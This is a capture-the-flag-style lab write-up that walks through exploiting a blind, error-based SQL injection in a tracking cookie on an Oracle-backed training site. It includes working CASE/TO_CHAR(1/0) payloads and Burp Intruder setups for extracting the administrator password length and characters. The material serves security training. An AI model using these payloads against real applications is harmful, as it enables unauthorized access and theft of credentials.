# Lab: Blind SQL injection with conditional errors

## Description

 This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user. 

## HINT

This lab uses an Oracle database. For more information, see the SQL injection cheat sheet.

# Step 1: Verify blind, conditional-error-based SQLi

## STEP 1 Finding injection point

I will be using burpsuite for this lab. To start, I start with intercept off and visit the target page in the browser. I also pull up the browser dev tools, in order to view and modify my cookie values.

![image](https://user-images.githubusercontent.com/83407557/169845297-c31515b2-98b3-478d-bdd7-07ed9c1e259c.png)

I then will try and attempt to get the server to error with a single quotation mark added to my tracking cookie and refreshing the page:

![image](https://user-images.githubusercontent.com/83407557/169846190-10990e6d-5b0e-4fe4-87a6-ff97b40404d2.png)

If I then add a comment -- the error goes away:

![image](https://user-images.githubusercontent.com/83407557/169846508-c3987f72-d92d-467a-9082-729621022ca5.png)


## STEP 2 Using true and false Select statement to cause an error

In oracle I need to select from something, which I will use the always valid table *dual*. 

A Valid statement would be:

```sql
SELECT * FROM dual
```

This is because dual exists and as long as the server can select from it, the statement will not error

and invalid statement would be:

```sql
SELECT * FROM doesnt_exist
```

So with that mind, I will need to concatonate this onto my payload like the following:

Should NOT error
```sql
'||(SELECT * FROM dual)--
```

SHOULD error
```sql
'||(SELECT * FROM doesn't_exist)--
```

![image](https://user-images.githubusercontent.com/83407557/169852091-d4c0f322-8cf5-408b-aca0-53e5724100ad.png)

![image](https://user-images.githubusercontent.com/83407557/169852204-6e97b877-fccd-4935-80d5-1b7878e34e55.png)

and it acts as expected.

## STEP 3 Crafting a True select statement that causes an error

since the goal is to guess each character of the administrators password, we need to make it so that if our select statement is true, the server will throw an error:

Because 1 does equal 1, this should error because 1/0 is an invalid operation

```sql
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)--
```

![image](https://user-images.githubusercontent.com/83407557/169855167-14bdbf28-ab76-4e57-83cb-d699e7aefd39.png)

However with the following because 1 does not equal 2, the sever will select anything ('') from dual and therefore not error

```sql
'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)--
```


![image](https://user-images.githubusercontent.com/83407557/169855765-b282598e-32da-4d1e-9325-dac145575ca6.png)


# STEP 4 Creating string for burp-intruder payload to determine password length


Since we know the table name is users and the username column will be administrator, we need to dig out the password column for that entry:

I want to test if the password is greater than a given number, if it is: the server should error. If the password is smaller than the given number, the server should not error. I will know how long the password is based on the highest given number that still errors.

The initial string will just test if the password is more that 1 character long. I will then send it to burp intruder

```sql
'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')--
```
I can then set the payload position at the number I am comparing the password length to:

![image](https://user-images.githubusercontent.com/83407557/169927613-cead1037-ddf6-49a4-9c06-119f40cfd87d.png)

And will set a sniper payload that is a set of numbers ranging from 1-30.

![image](https://user-images.githubusercontent.com/83407557/169927748-e8979edf-4647-4628-944f-71c6454a2ada.png)

This attack should error out until the password length is given from the set of numbers

![image](https://user-images.githubusercontent.com/83407557/169927902-6466f9bd-ea4c-4158-b194-959cb4a5fe88.png)

because the is password > 20 did not return an error, this lets me know that the password is 20 characters long.

# STEP 5 Use substring method to guess 20 character long password

In a similar fasion I can create a query that can guess the password one character at a time, until all 20 are guessed. 

The initial query string:

This tests if the first character is an 'a'
```sql
'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')--
```

This would check if the second character was 'b'
```sq;
'||(SELECT CASE WHEN SUBSTR(password,2,1)='b' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')
```

With that in mind, lets build a burp intruder attack:

It will be a cluster bomb, with two payload positions. The first at the substring number, the second at the letter we are guessing.

![image](https://user-images.githubusercontent.com/83407557/169928628-e02b9304-e80c-4b53-9e4f-01d218dcb705.png)

The first payload will be the number 1-20

![image](https://user-images.githubusercontent.com/83407557/169928707-11642282-9a35-4c3a-804c-d85307f4061e.png)

the second is a brute force with all lowercase letters and the numbers 0-9.

![image](https://user-images.githubusercontent.com/83407557/169928811-7c43b756-79ee-4c82-83bb-752a0df3e34f.png)

As you can see this will create a lot of requests, so go get a coffee at the farther place that is a little more fancy (if you are on burp community like me). However we just are interested in the 20 responses that are errors, so after a nap, we should have the password.



